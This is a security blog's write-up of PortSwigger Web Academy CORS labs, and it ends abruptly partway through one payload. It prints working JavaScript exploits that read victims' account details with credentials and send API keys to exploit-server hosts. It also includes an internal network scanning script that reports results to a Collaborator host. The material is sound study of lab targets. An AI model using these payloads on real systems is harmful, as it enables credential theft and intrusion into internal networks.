<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(Portswigger/WebAcademy) - Cross-Origin Resource Sharing (CORS)" /><meta name="author" content="eng4ge" /><meta property="og:locale" content="en" /><meta name="description" content="Intro This post/writeup is all about the Cross-Origin Resource Sharing or simply CORS." /><meta property="og:description" content="Intro This post/writeup is all about the Cross-Origin Resource Sharing or simply CORS." /><link rel="canonical" href="https://an9k0r.github.io/posts/CORS/" /><meta property="og:url" content="https://an9k0r.github.io/posts/CORS/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-12-21T08:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(Portswigger/WebAcademy) - Cross-Origin Resource Sharing (CORS)" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@eng4ge" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"eng4ge"},"description":"Intro This post/writeup is all about the Cross-Origin Resource Sharing or simply CORS.","headline":"(Portswigger/WebAcademy) - Cross-Origin Resource Sharing (CORS)","dateModified":"2022-12-21T08:00:00+01:00","url":"https://an9k0r.github.io/posts/CORS/","datePublished":"2022-12-21T08:00:00+01:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/CORS/"},"@context":"https://schema.org"}</script><title>(Portswigger/WebAcademy) - Cross-Origin Resource Sharing (CORS) | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(Portswigger/WebAcademy) - Cross-Origin Resource Sharing (CORS)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>(Portswigger/WebAcademy) - Cross-Origin Resource Sharing (CORS)</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">eng4ge</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-12-21 08:00:00 +0100" data-toggle="tooltip" data-placement="bottom" title="Wed, Dec 21, 2022, 8:00 AM +0100" >Dec 21, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1086 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><h1 id="intro">Intro</h1><p>This post/writeup is all about the Cross-Origin Resource Sharing or simply CORS.</p><p>I’ll be using primarily <a href="https://portswigger.net/web-security/cors">Portswigger Web Academy</a> Labs, but i do intent do throw other labs and writeups here as well.</p><p>To learn more on the topic, please visit the article linked above at Portswigger’s.</p><blockquote><p>CORS is a controlled relaxation of the same-origin policy (SOP) and does not protect against CSRF!</p></blockquote><h2 id="toc">TOC<a href="#toc" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><a href="#intro">Intro</a><ul><li><a href="#toc">TOC</a></ul><li><a href="#cors-vulnerability-with-basic-origin-reflection">CORS vulnerability with basic origin reflection</a><li><a href="#cors-vulnerability-with-trusted-null-origin">CORS vulnerability with trusted null origin</a><li><a href="#cors-vulnerability-with-trusted-insecure-protocols">CORS vulnerability with trusted insecure protocols</a><li><a href="#cors-vulnerability-with-internal-network-pivot-attack">CORS vulnerability with internal network pivot attack</a></ul><h1 id="cors-vulnerability-with-basic-origin-reflection">CORS vulnerability with basic origin reflection</h1><blockquote><p>This website has an insecure CORS configuration in that it trusts all origins.</p><p>To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator’s API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator’s API key.</p><p>You can log in to your own account using the following credentials: <code class="language-plaintext highlighter-rouge">wiener:peter</code></p></blockquote><p>When we login using <code class="language-plaintext highlighter-rouge">wiener:peter</code> credentials, we’ll get <code class="language-plaintext highlighter-rouge">apikey</code> returned which we’re supposed to steal.</p><p><img data-src="/assets/images/0abf48bf7e0c86468510043df498133b7dc231b87dfe551302c737de9a5f2174.png" alt="picture 1" data-proofer-ignore></p><p>Mind the response header</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
...
</pre></table></code></div></div><p>This means that credentials can be sent over different domains. If we add <code class="language-plaintext highlighter-rouge">Origin: canary.si</code>, Response will include that domain in CORS</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Access-Control-Allow-Origin: canary.si
</pre></table></code></div></div><p>I’ve used following script to achieve that goal:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
<span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://0a4700fd04d5c6d8c0997d1e000b0018.web-security-academy.net/accountDetails</span><span class="dl">"</span><span class="p">,{</span><span class="dl">"</span><span class="s2">credentials</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">include</span><span class="dl">"</span><span class="p">})</span>
<span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">res</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">()})</span>
<span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">body</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="kd">var</span> <span class="nx">apikey</span> <span class="o">=</span> <span class="nx">body</span><span class="p">[</span><span class="dl">"</span><span class="s2">apikey</span><span class="dl">"</span><span class="p">];</span> <span class="nx">fetch</span> <span class="p">(</span><span class="dl">"</span><span class="s2">https://exploit-0a7900600492c601c0787c1101bb00b0.exploit-server.net/c=</span><span class="dl">"</span><span class="o">+</span><span class="nx">apikey</span><span class="p">,{</span><span class="dl">"</span><span class="s2">mode</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">no-cors</span><span class="dl">"</span><span class="p">});})</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p><img data-src="/assets/images/24061e99854664be8ccfb30aab04304b2e98a9f68193419244de662e58d60aa3.png" alt="picture 2" data-proofer-ignore></p><p>This is solution proposed from Portswigger which uses <code class="language-plaintext highlighter-rouge">XMLHttpRequest()</code>:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
    <span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
    <span class="nx">req</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nx">reqListener</span><span class="p">;</span>
    <span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">get</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">YOUR-LAB-ID.web-security-academy.net/accountDetails</span><span class="dl">'</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
    <span class="nx">req</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
    <span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>

    <span class="kd">function</span> <span class="nx">reqListener</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">location</span><span class="o">=</span><span class="dl">'</span><span class="s1">/log?key=</span><span class="dl">'</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
    <span class="p">};</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><h1 id="cors-vulnerability-with-trusted-null-origin">CORS vulnerability with trusted null origin</h1><blockquote><p>This website has an insecure CORS configuration in that it trusts the “null” origin.</p><p>To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator’s API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator’s API key.</p><p>You can log in to your own account using the following credentials: <code class="language-plaintext highlighter-rouge">wiener:peter</code></p></blockquote><p>This web application is just like the previous one, just CORS accepts <code class="language-plaintext highlighter-rouge">null</code> origin.</p><p>This is the payload that was used</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nt">&lt;iframe</span> <span class="na">sandbox=</span><span class="s">"allow-scripts allow-top-navigation allow-forms"</span> <span class="na">srcdoc=</span><span class="s">"&lt;script&gt;
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a5b002b03d66285c15b953900c600c7.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='exploit-0a6b00ee03b062d6c11c940701ad00ca.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
&lt;/script&gt;"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</pre></table></code></div></div><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nt">&lt;iframe</span> <span class="na">sandbox=</span><span class="s">"allow-scripts allow-top-navigation allow-forms"</span> <span class="na">srcdoc=</span><span class="s">"&lt;script&gt;fetch('https://0a6b00ee03b062d6c11c940701ad00ca.web-security-academy.net/accountDetails',{'credentials':'include'})
.then(res =&gt; {return res.json()})
.then(body =&gt; { var apikey = body['apikey']; fetch ('https://exploit-0a6b00ee03b062d6c11c940701ad00ca.exploit-server.net/c='+apikey,{'mode':'no-cors'});})&lt;/script&gt;"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</pre></table></code></div></div><h1 id="cors-vulnerability-with-trusted-insecure-protocols">CORS vulnerability with trusted insecure protocols</h1><blockquote><p>This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.</p><p>To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator’s API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator’s API key.</p><p>You can log in to your own account using the following credentials: <code class="language-plaintext highlighter-rouge">wiener:peter</code>doc</p></blockquote><p>Login using provided credentials <code class="language-plaintext highlighter-rouge">wiener:peter</code>.</p><p><img data-src="/assets/images/992aa55d686db72472a2ed6e5c0523213bcf10be4c2e7521dbf217d972c6a6a0.png" alt="picture 3" data-proofer-ignore></p><p>Notice the <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Credentials: true</code>. CORS seems to be in place.</p><p><img data-src="/assets/images/42b7f43b1d9cd2b7b1f7caf8a8a3f27a7da0072c1e8d39588ce5c3bb16f6ddad.png" alt="picture 4" data-proofer-ignore></p><p>If we add Origin pointing to same lab’s subdomain, it will reflect in <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> header.</p><p>We’ll take a note of that and try to find XSS so we can actually exploit CORS setting/vulnerability.</p><p><img data-src="/assets/images/d5471d87fe84eb0f7c9c92f64338201de1f24b19dedbf91eaceb5a32cdf8a4d3.png" alt="picture 5" data-proofer-ignore></p><p><code class="language-plaintext highlighter-rouge">Check stock</code> will send a request to <code class="language-plaintext highlighter-rouge">http://stock.LAB-ID.web-security-academy.net/?productId=2&amp;storeId=1</code></p><p>XSS is present in <code class="language-plaintext highlighter-rouge">productId</code> parameter as it simply reflect the provided “id” in the Error message:</p><p><img data-src="/assets/images/2030cebd9412834e0b239220f1a98352ee2b214388fb4de20569337f42bd495c.png" alt="picture 8" data-proofer-ignore></p><p>Alert fires as expected.</p><p><img data-src="/assets/images/e2b31b7134a518553c7e39a9e430b04fcbc00a2c0e921d0ea9e36ae218ab37bf.png" alt="picture 7" data-proofer-ignore></p><p>Payload:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://stock.0adc002b04a1979ac0f1efab00aa0062.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0adc002b04a1979ac0f1efab00aa0062.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a1d004d045797b8c041ee4d01fb0039.exploit-server.net/log?key='%2bthis.responseText; };%3c/script&gt;&amp;storeId=1</span><span class="dl">"</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Payload above will be served on our exploit server. For better readability, this is the script that is provided into XSS payload</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>

<span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> 
<span class="nx">req</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nx">reqListener</span><span class="p">;</span> 
<span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">get</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">https://0adc002b04a1979ac0f1efab00aa0062.web-security-academy.net/accountDetails</span><span class="dl">'</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span> 
<span class="nx">req</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span><span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>

<span class="kd">function</span> <span class="nx">reqListener</span><span class="p">()</span> <span class="p">{</span>
  <span class="nx">location</span><span class="o">=</span><span class="dl">'</span><span class="s1">https://exploit-0a1d004d045797b8c041ee4d01fb0039.exploit-server.net/log?key=</span><span class="dl">'</span><span class="o">%</span><span class="mi">2</span><span class="nx">bthis</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span> 
  <span class="p">};</span>

<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Victim should connect to our server unknowingly. We should see an entry with APIKey in our logs.</p><p><img data-src="/assets/images/3e8ca303e636472f636097e2f413825772f85e551677d94e33d5d00d3986d982.png" alt="picture 6" data-proofer-ignore></p><h1 id="cors-vulnerability-with-internal-network-pivot-attack">CORS vulnerability with internal network pivot attack</h1><p><strong>BURP Professional needed (collaborator)</strong></p><blockquote><p>This website has an insecure CORS configuration in that it trusts all internal network origins.</p><p>This lab requires multiple steps to complete. To solve the lab, craft some JavaScript to locate an endpoint on the local network (192.168.0.0/24, port 8080) that you can then use to identify and create a CORS-based attack to delete a user. The lab is solved when you delete user Carlos.</p></blockquote><p>This attack will have to be performed in few steps as we need to enumerate first, hence needing more than a single script.</p><p>This is the code that will be used to enumerate the internal network. It will be copied to an exploit server and delivered to victim.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">q</span> <span class="o">=</span> <span class="p">[],</span> <span class="nx">collaboratorURL</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">http://jczxolrxtxilgme7dqz1sb1g57byzond.oastify.com</span><span class="dl">'</span><span class="p">;</span>

<span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;=</span><span class="mi">255</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">q</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">return</span> <span class="kd">function</span><span class="p">(</span><span class="nx">wait</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">fetchUrl</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">wait</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}(</span><span class="dl">'</span><span class="s1">http://192.168.0.</span><span class="dl">'</span><span class="o">+</span><span class="nx">i</span><span class="o">+</span><span class="dl">'</span><span class="s1">:8080</span><span class="dl">'</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;=</span><span class="mi">20</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
	<span class="k">if</span><span class="p">(</span><span class="nx">q</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span><span class="nx">q</span><span class="p">.</span><span class="nx">shift</span><span class="p">()(</span><span class="nx">i</span><span class="o">*</span><span class="mi">100</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">fetchUrl</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">wait</span><span class="p">)</span> <span class="p">{</span>
	<span class="kd">var</span> <span class="nx">controller</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">AbortController</span><span class="p">(),</span> <span class="nx">signal</span> <span class="o">=</span> <span class="nx">controller</span><span class="p">.</span><span class="nx">signal</span><span class="p">;</span>
	<span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span><span class="nx">signal</span><span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span> <span class="o">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">text</span> <span class="o">=&gt;</span> <span class="p">{</span>
		<span class="nx">location</span> <span class="o">=</span> <span class="nx">collaboratorURL</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">?ip=</span><span class="dl">'</span><span class="o">+</span><span class="nx">url</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^http:</span><span class="se">\/\/</span><span class="sr">/</span><span class="p">,</span><span class="dl">''</span><span class="p">)</span><span class="o">+</span><span class="dl">'</span><span class="s1">&amp;code=</span><span class="dl">'</span><span class="o">+</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">text</span><span class="p">)</span><span class="o">+</span><span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span><span class="o">+</span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
	<span class="p">}))</span>
	<span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span> <span class="o">=&gt;</span> <span class="p">{</span>
		<span class="k">if</span><span class="p">(</span><span class="nx">q</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">q</span><span class="p">.</span><span class="nx">shift</span><span class="p">()(</span><span class="nx">wait</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">});</span>
	<span class="nx">setTimeout</span><span class="p">(</span><span class="nx">x</span> <span class="o">=&gt;</span> <span class="p">{</span>
		<span class="nx">controller</span><span class="p">.</span><span class="nx">abort</span><span class="p">();</span>
		<span class="k">if</span><span class="p">(</span><span class="nx">q</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">q</span><span class="p">.</span><span class="nx">shift</span><span class="p">()(</span><span class="nx">wait</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">},</span> <span class="nx">wait</span><span class="p">);</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>After some time HTTP request should hit our Collaborator instance:</p><p><img data-src="/assets/images/1e6bbbad9fd5d3cd8366fba4df05551596115616688e124946675178ad055959.png" alt="picture 9" data-proofer-ignore></p><p>Next payload will check for XSS in the username field.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nx">xss</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">text</span><span class="p">,</span> <span class="nx">vector</span><span class="p">)</span> <span class="p">{</span>
